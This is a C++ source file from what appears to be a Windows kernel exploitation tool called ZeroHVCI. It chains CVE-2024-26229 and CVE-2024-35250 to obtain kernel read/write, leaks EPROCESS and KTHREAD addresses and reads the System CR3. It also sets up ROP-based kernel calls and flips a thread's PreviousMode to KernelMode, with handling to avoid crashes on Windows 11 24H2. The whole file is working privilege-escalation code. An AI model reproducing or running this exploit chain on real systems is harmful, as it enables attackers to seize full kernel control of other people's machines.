#include "zerohvci.h"
#include "exploit.h"
#include "kforge.h"
#include <cstdio>

namespace zerohvci {

// File-scope state variables
static bool g_Initialized = false;
static ULONG64 g_CurrentKThread = 0;
static ULONG64 g_CurrentEProcess = 0;
static ULONG64 g_SystemCr3 = 0;

bool Initialize()
{
    if (g_Initialized) {
        printf("[+] ZeroHVCI already initialized\n");
        return true;
    }

    printf("[*] Initializing ZeroHVCI exploit chain...\n");

    // Step 1: Leak EPROCESS and KTHREAD addresses
    printf("[*] Leaking kernel object addresses...\n");
    g_CurrentEProcess = GetCurrentEProcess();
    g_CurrentKThread = GetCurrentKThread();

    if (!g_CurrentEProcess || !g_CurrentKThread) {
        printf("[-] Failed to leak kernel object addresses\n");
        return false;
    }

    printf("[+] EPROCESS: 0x%llx\n", g_CurrentEProcess);
    printf("[+] KTHREAD: 0x%llx\n", g_CurrentKThread);

    // Step 2: Try CSC exploit first (CVE-2024-26229)
    printf("[*] Attempting CSC exploit (CVE-2024-26229)...\n");
    if (ObtainKernelExploitCSC(g_CurrentKThread)) {
        printf("[+] CSC exploit succeeded - kernel R/W obtained\n");
    }
    else {
        // Fallback to KS exploit (CVE-2024-35250)
        printf("[-] CSC exploit failed, trying KS exploit (CVE-2024-35250)...\n");
        if (ObtainKernelExploitKS(g_CurrentKThread)) {
            printf("[+] KS exploit succeeded - kernel R/W obtained\n");
        }
        else {
            printf("[-] Both exploits failed\n");
            return false;
        }
    }

    // Step 3: Initialize KernelForge for ROP-based kernel function calls
    printf("[*] Initializing KernelForge...\n");
    if (!kforge::Initialize()) {
        printf("[-] KernelForge initialization failed\n");
        return false;
    }

    printf("[+] KernelForge initialized successfully\n");

    // Step 4: Test kernel read/write using the exploit primitives directly
    printf("[*] Testing kernel memory access...\n");
    ULONG64 testValue = 0;
    // Use ReadKernelMemory from exploit.h (no namespace prefix - we're already inside zerohvci)
    if (!ReadKernelMemory((PVOID)g_CurrentKThread, &testValue, sizeof(ULONG64))) {
        printf("[-] Kernel read test failed\n");
        return false;
    }
    printf("[+] Kernel read test passed (read: 0x%llx)\n", testValue);

    // Read System CR3 from EPROCESS + 0x28 (DirectoryTableBase)
    // First get System EPROCESS via PID 4
    ULONG64 systemEprocess = GetEProcessViaPID(4);
    if (systemEprocess) {
        // Use ReadKernelMemory from exploit.h (no namespace prefix)
        ReadKernelMemory((PVOID)(systemEprocess + 0x28), &g_SystemCr3, sizeof(ULONG64));
        printf("[+] System CR3: 0x%llx\n", g_SystemCr3);
    } else {
        printf("[-] Failed to get System EPROCESS for CR3\n");
        g_SystemCr3 = 0;
    }

    g_Initialized = true;
    printf("[+] ZeroHVCI initialization complete\n");
    return true;
}

bool ReadKernelMemoryEx(void* src, void* dst, size_t size)
{
    if (!g_Initialized) {
        printf("[-] ReadKernelMemory: ZeroHVCI not initialized\n");
        return false;
    }

    // Delegate to exploit.h's ReadKernelMemory primitive
    // (no namespace prefix - we're inside zerohvci namespace)
    return ReadKernelMemory(src, dst, static_cast<ULONG>(size));
}

bool WriteKernelMemoryEx(void* dst, void* src, size_t size)
{
    if (!g_Initialized) {
        printf("[-] WriteKernelMemory: ZeroHVCI not initialized\n");
        return false;
    }

    // Delegate to exploit.h's WriteKernelMemory primitive
    // (no namespace prefix - we're inside zerohvci namespace)
    // CRITICAL FIX: Was passing &src (address of pointer) instead of src (the buffer)
    return WriteKernelMemory(dst, src, static_cast<ULONG>(size));
}

void* AllocateKernelPool(size_t size)
{
    if (!g_Initialized) {
        printf("[-] AllocateKernelPool: ZeroHVCI not initialized\n");
        return nullptr;
    }

    // Use NonPagedPoolNx for executable allocations
    return kforge::ExAllocatePool(NonPagedPoolNx, size);
}

void Cleanup()
{
    if (!g_Initialized) {
        return;
    }

    printf("[*] Cleaning up ZeroHVCI...\n");

    //=========================================================================
    // CRITICAL FIX: Restore PreviousMode to UserMode (1)
    // Required for Windows 11 24H2+ (Build 26100+) which validates thread
    // state on return to usermode. Without this, BSOD 0x1F9 occurs.
    //=========================================================================
    if (g_CurrentKThread) {
        constexpr ULONG PREVIOUSMODE_OFFSET = 0x232;
        BYTE userMode = 1;

        if (WriteKernelMemory(
                (PVOID)(g_CurrentKThread + PREVIOUSMODE_OFFSET),
                &userMode,
                sizeof(BYTE))) {
            printf("[+] PreviousMode restored to UserMode\n");
        } else {
            printf("[-] WARNING: Failed to restore PreviousMode - potential BSOD on Win11 24H2+!\n");
        }
    }

    // Cleanup KernelForge
    kforge::Cleanup();

    g_Initialized = false;
    g_CurrentKThread = 0;
    g_CurrentEProcess = 0;
    g_SystemCr3 = 0;

    printf("[+] ZeroHVCI cleanup complete\n");
}

bool IsInitialized()
{
    return g_Initialized;
}

ULONG64 GetSystemCr3()
{
    return g_SystemCr3;
}

ULONG64 GetCachedKThread()
{
    return g_CurrentKThread;
}

ULONG64 GetCachedEProcess()
{
    return g_CurrentEProcess;
}

//=============================================================================
// ScopedKernelMode Implementation
// RAII wrapper for PreviousMode manipulation - CRITICAL for Win11 24H2+
//=============================================================================

ScopedKernelMode::ScopedKernelMode() {
    // Get current KTHREAD - use cached value from ZeroHVCI init
    m_kthread = GetCachedKThread();
    if (!m_kthread) {
        m_kthread = GetCurrentKThread();
    }

    if (!m_kthread) {
        printf("[-] ScopedKernelMode: Failed to get KTHREAD\n");
        return;
    }

    // Read current PreviousMode
    if (!ReadKernelMemory(
            (PVOID)(m_kthread + PREVIOUSMODE_OFFSET),
            &m_originalMode,
            sizeof(BYTE))) {
        printf("[-] ScopedKernelMode: Failed to read PreviousMode\n");
        return;
    }

    // Only flip if currently in UserMode
    if (m_originalMode == 1) {
        BYTE kernelMode = 0;
        if (WriteKernelMemory(
                (PVOID)(m_kthread + PREVIOUSMODE_OFFSET),
                &kernelMode,
                sizeof(BYTE))) {
            m_elevated = true;
            printf("[+] ScopedKernelMode: Elevated to KernelMode (was UserMode)\n");
        } else {
            printf("[-] ScopedKernelMode: Failed to write KernelMode\n");
        }
    } else {
        // Already in KernelMode (exploit already ran on this thread)
        m_elevated = true;
        printf("[*] ScopedKernelMode: Already in KernelMode\n");
    }
}

ScopedKernelMode::~ScopedKernelMode() {
    if (!m_kthread) {
        return;
    }

    // ALWAYS restore to UserMode (1) regardless of original state
    // This is critical for Win11 24H2+ which validates on return
    BYTE userMode = 1;
    if (WriteKernelMemory(
            (PVOID)(m_kthread + PREVIOUSMODE_OFFSET),
            &userMode,
            sizeof(BYTE))) {
        printf("[+] ScopedKernelMode: Restored to UserMode\n");
    } else {
        printf("[-] ScopedKernelMode: CRITICAL - Failed to restore UserMode!\n");
        // Note: Failure here will cause BSOD on Win11 24H2+
        // There's no safe fallback - we MUST restore
    }
}

} // namespace zerohvci
